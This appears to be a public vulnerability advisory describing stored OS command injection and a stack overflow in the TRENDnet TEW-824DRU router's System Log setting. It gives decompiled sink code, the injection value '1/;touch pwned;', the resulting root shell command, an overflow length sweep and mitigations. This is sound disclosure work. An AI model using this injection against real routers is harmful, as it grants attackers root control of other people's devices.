# TRENDnet TEW-824DRU — Stored OS Command Injection in the System Log Settings

| Field | Value |
|---|---|
| **Product** | TRENDnet TEW-824DRU (Wireless N dual-band router) |
| **Firmware** | 1.00b18 |
| **Platform** | MIPS32 little-endian, uClibc; admin UI served by `/www/cgi/ssi` |
| **Vulnerability class** | CWE-78 — Improper Neutralization of Special Elements used in an OS Command |
| **Related weakness** | CWE-121 — Stack-based Buffer Overflow (same value, same code path) |
| **CVSS v3.1** | `CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` = **6.8 (Medium)** |
| **Authentication required** | Administrator session; the form handler that writes the option is static-only (§0) |
| **Attack vector** | Adjacent network (LAN) |
| **Impact** | Command execution as **root**; the value also crashes the System Log request |
| **Status** | Confirmed (dynamic: vendor `ssi` CGI, injected command executed as root) |
| **CVE ID** | *Requested — VulDB submission pending* |
| **Disclosure** | Public advisory (this repository); earlier copy at https://gist.github.com/qwq-nm/b3027508114354faa37384f9262a5891 |

> **Scope note.** The device-side `uhttpd` → `ssi` HTTP hop was not exercised: the
> reproduction invokes the firmware's own `ssi` CGI directly with the CGI environment set
> by the vendor web server (`PATH_TRANSLATED=/www/adm_syslog.asp`). The option value was
> written into `/etc/config/cameo` directly, i.e. the same UCI store the page writes, but
> the form handler that performs the write was **not** exercised. The sink, the injected
> command line and the resulting file are real; the write path and the HTTP transport are
> established statically. Physical hardware was not used.

---

## 0. Repository layout

| Path | Content |
|---|---|
| `README.md` | This advisory |
| `poc/replay_824_syslog.sh` | Control / injection / length-sweep reproduction against an extracted rootfs |
| `evidence/01-replay.png` | Terminal capture of the control, trigger and overflow runs |
| `evidence/02-source.png` | Decompiled sink and the resulting `sh -c` command line |
| `evidence/03-raw-transcript.txt` | Raw output of the three runs |

---

## 1. Summary

The System Log page of the TEW-824DRU admin UI (`/www/adm_syslog.asp`) configures
forwarding of kernel/syslog output to a remote server. The configured value
(`cameo.cameo.syslog_server`, format `<mode>/<host>`) is read while the page is
rendered by `/www/cgi/ssi` and copied into a 24-byte stack buffer with `strcpy()`.
When the first `/`-separated segment equals `1`, the remainder is formatted into a
shell command:

```c
sprintf(buf, "syslogd -C%d -L -R %s:514 &", 0x14, host);
system(buf);
```

Neither `;`, `|`, backticks nor `$()` are filtered, so `1/;touch pwned;` makes the
device run `sh -c "syslogd -C20 -L -R ;touch pwned;:514 &"` and the injected command
executes as root. The same `strcpy()` has no bounds check: a 24-byte value crashes
`ssi` with SIGSEGV, 28 bytes with SIGBUS (23 bytes was not tested; 24 is the first
tested failing length).

## 2. Affected components

| Item | Value |
|---|---|
| Firmware image SHA-256 | `179746dfc34b158f5bde802d176d35692046fe211b021f63e4d3ef3746ffcfe3` |
| `/www/cgi/ssi` SHA-256 | `010be6fab9f316638bc2059abde18d1d24bd846889b5cd3fe8b90f576590afaf` |
| Vulnerable page | `/www/adm_syslog.asp` → `start_syslogd()` |
| Configuration option | `cameo.cameo.syslog_server` in `/etc/config/cameo` |
| Firmware download | `https://download.trendnet.com/TEW-824DRU/Firmware/1.00b18.zip` |

Only the 1.00b18 image above was analysed.

## 3. Technical details

### 3.1 Sink

```text
Admin page "System Log"  →  UCI cameo.cameo.syslog_server = "1/<host>"
  → /www/cgi/ssi: FUN_004fad20
        pcVar10 = uci_safe_get("cameo.cameo.syslog_server");
        strcpy(&local_20, pcVar10);                 /* 24-byte stack buffer */
        system("killall syslogd klogd");
        seg1 = strtok(&local_20, "/");
        host = strtok(NULL, "/");
        if (strcmp(seg1, "1") == 0)
            sprintf(buf, "syslogd -C%d -L -R %s:514 &", 0x14, host);
        system(buf);                                ← sink
```

Format strings present in the binary: `cameo.cameo.syslog_server`, `/`, `1`,
`syslogd -C%d -L -R %s:514 &`, `killall syslogd klogd`.

### 3.2 Observed behaviour

| Run | `syslog_server` value | Resulting command line | `pwned` file |
|---|---|---|---|
| Control | `1/0.0.0.0` | `sh -c "syslogd -C20 -L -R 0.0.0.0:514 &"` | absent |
| Trigger | `1/;touch pwned;` | `sh -c "syslogd -C20 -L -R ;touch pwned;:514 &"` | **present**, `root:root` `644`, 0 bytes |

The command line was captured with `qemu-mips-static -strace` (the `execve` of
`/bin/sh`), not inferred from the source.

Length sweep on the same option (no `;`, so only the buffer matters):

```text
len: 20:0  22:0  24:139  26:139  28:135
```

Exit code `139` = SIGSEGV, `135` = SIGBUS. 20 and 22 bytes are accepted; 24 is the
first tested length that fails. The crash terminates the request that renders the
System Log page; it is not a persistent denial of service of the whole web server.

### 3.3 Verification status (accurate scope)

- **Dynamically confirmed**: the vendor `ssi` binary, running in a QEMU user-mode
  chroot over the extracted rootfs, executes the injected command as root, and crashes
  on a 24-byte value.
- **Not exercised**: the form handler that writes the option, the vendor `uhttpd` HTTP
  hop (the CGI was invoked directly with the environment `uhttpd` sets), and physical
  hardware.
- The vulnerable code was not modified.

## 4. Proof of concept

`poc/replay_824_syslog.sh` requires an extracted rootfs, `qemu-mips-static`, and root
(for `chroot`):

```bash
ROOTFS=/path/to/extracted/rootfs ./replay_824_syslog.sh
```

It backs up `/etc/config/cameo`, runs the control, the injection and the length sweep,
and restores the file on exit. Expected output:

```text
########## CONTROL   syslog_server '1/0.0.0.0' ##########
    exit=0
    sh -c "syslogd -C20 -L -R 0.0.0.0:514 &",NULL
    pwned: absent

########## TRIGGER   syslog_server '1/;touch pwned;' ##########
    exit=0
    sh -c "syslogd -C20 -L -R ;touch pwned;:514 &",NULL
    pwned: present, root:root 644 0 bytes

########## OVERFLOW   length sweep (same option, no ';')
    len: 20:0  22:0  24:139  26:139  28:135
```

Only one variable changes between the control and the trigger run: the
`syslog_server` value.

The DUT-side write path is not exercised: the value is placed in `/etc/config/cameo`
directly, i.e. the same UCI store the page writes. If the form applied its own
validation to the host field, the reachable path would be blocked; that was not tested.

## 5. Impact

- Command execution as root on the router. The CGI ran as uid 0 inside the emulation
  chroot; the uid of `ssi` on a shipped device was not measured.
- Precondition: an authenticated admin session. The report does **not** claim a CSRF
  vector — `UI:N` is used because the victim does not interact with a crafted page;
  the attacker needs the admin credential (or an equivalent write primitive on the
  configuration store).
- The same option crashes the request that renders the System Log page, which is a
  localised denial of service of that page, not of the whole management service.

## 6. Existing CVEs and differences

No public advisory was located for the `syslog_server` option on the TEW-824DRU
(search date 2026-11-03). Command injection in TRENDnet router management interfaces
has been reported for other models and endpoints, but the affected page, the
configuration key and the `ssi` handler above are specific to the 1.00b18 firmware
line; this report does not claim shared code with those products.

## 7. Mitigation

- Validate `syslog_server` as `<mode>/<host>`: `mode ∈ {0,1}`, `host` a hostname or IP
  literal; reject everything else.
- Build the `syslogd` argument vector with `execv()` instead of a shell string.
- Replace `strcpy()` with a bounded copy (the destination is 24 bytes).
- Add an origin/session check to the state-changing request (defence in depth; this
  report does not claim a CSRF vector).
- Vendor-side: remove the shell indirection entirely; do not pass configuration values
  through `system()`.

## 8. Disclosure timeline

| Date | Event |
|---|---|
| 2026-10-30 | Static analysis of `FUN_004fad20` (sink, format strings, 24-byte buffer) |
| 2026-10-31 | Dynamic reproduction with the vendor `ssi`: command execution and overflow sweep |
| 2026-11-03 | External adversarial review (`gpt-5` via `gpt_ask.py review` profile): `not_refuted` |
| 2026-11-03 | CVE requested via VulDB (vendor/CNA channel) |
| 2026-11-03 | Severity re-verified: `AV:A/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` = **6.8 (Medium)** under CVSS 3.1 (`PR:H` weight 0.27 for `S:U`); unchanged |
| 2026-11-03 | Public advisory published in this repository |

No vendor response had been received at publication time; the vendor was contacted
through the CNA submission (VulDB).

## 9. Notes on scope and integrity of the report

- Evidence is from QEMU user-mode emulation, not hardware. The HTTP transport between
  `uhttpd` and `ssi`, and the form handler that writes the UCI option, are not part of
  the dynamic run.
- No personal information, contact address or researcher identifier is included in
  this document or its attachments.
- No credential, persistence mechanism or turnkey payload is published; the PoC only
  creates an empty marker file.

## 10. References

- Vendor: TRENDnet — https://www.trendnet.com
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
- CWE-121: https://cwe.mitre.org/data/definitions/121.html
